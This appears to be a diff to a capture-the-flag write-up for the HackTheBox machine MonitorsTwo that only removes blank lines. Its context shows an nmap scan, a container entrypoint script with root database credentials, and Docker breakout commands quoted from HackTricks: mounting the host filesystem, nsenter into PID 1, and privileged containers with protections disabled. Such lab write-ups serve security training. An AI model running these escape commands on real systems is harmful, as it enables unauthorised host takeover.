@@ -20,7 +20,6 @@ MonitorsTwo is an Easy Difficulty Linux machine showcasing a variety of vulnerab
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Fri Jul 14 13:04:33 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA monitorstwo 10.10.11.211
 Nmap scan report for 10.10.11.211
 Host is up, received user-set (0.061s latency).
@@ -45,7 +44,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Fri Jul 14 13:05:18 2023 -- 1 IP address (1 host up) scanned in 45.05 seconds
 ```
 
@@ -217,7 +215,6 @@ ls -la /
 > `entrypoint.sh`
 
 ```bash
-
 #!/bin/bash
 set -ex
 
@@ -229,7 +226,6 @@ if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~
 fi
 
 chown www-data:www-data -R /var/www/html
-
 # first arg is `-f` or `--some-option`
 if [ "${1#-}" != "$1" ]; then
         set -- apache2-foreground "$@"
@@ -636,28 +632,22 @@ Much more easier to escape from privileged containers
 > https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape
 
 ```bash
-
 #Search the socket
 find / -name docker.sock 2>/dev/null
-
 #It's usually in /run/docker.sock
 ```
 
 If the file is found, then
 
 ```bash
-
 #List images to use one
 docker images
-
 #Run the image mounting the host disk and chroot on it
 docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
-
 
 # Get full access to the host via ns pid and nsenter cli
 docker run -it --rm --pid=host --privileged ubuntu bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
-
 
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
